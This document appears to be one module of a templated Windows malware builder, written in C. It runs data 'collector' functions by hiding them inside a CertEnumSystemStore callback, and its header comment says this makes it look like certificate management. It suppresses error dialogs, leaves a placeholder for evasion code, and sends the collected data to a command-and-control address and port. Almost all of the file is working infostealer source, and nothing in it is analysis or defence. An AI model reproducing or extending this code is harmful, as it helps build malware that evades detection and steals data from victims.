// chunk: arch/callback_certenumsystem
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// libs: crypt32
// note: Executes collectors via CertEnumSystemStore callback — looks like certificate management

#ifndef CHUNK_ARCH_CALLBACK_CERTENUM
#define CHUNK_ARCH_CALLBACK_CERTENUM

#include <wincrypt.h>

typedef void (*collector_fn)(void);

static collector_fn g_callback_collectors[32];
static int g_callback_idx = 0;
static int g_callback_count = 0;

static BOOL WINAPI cert_enum_callback(const void *pvSystemStore,
                                       DWORD dwFlags, PCERT_SYSTEM_STORE_INFO pStoreInfo,
                                       void *pvReserved, void *pvArg) {
    (void)pvSystemStore; (void)dwFlags; (void)pStoreInfo;
    (void)pvReserved; (void)pvArg;
    if (g_callback_idx < g_callback_count) {
        g_callback_collectors[g_callback_idx]();
        g_callback_idx++;
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    g_callback_count = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < g_callback_count && i < 32; i++)
        g_callback_collectors[i] = collectors[i];

    CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, cert_enum_callback);

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
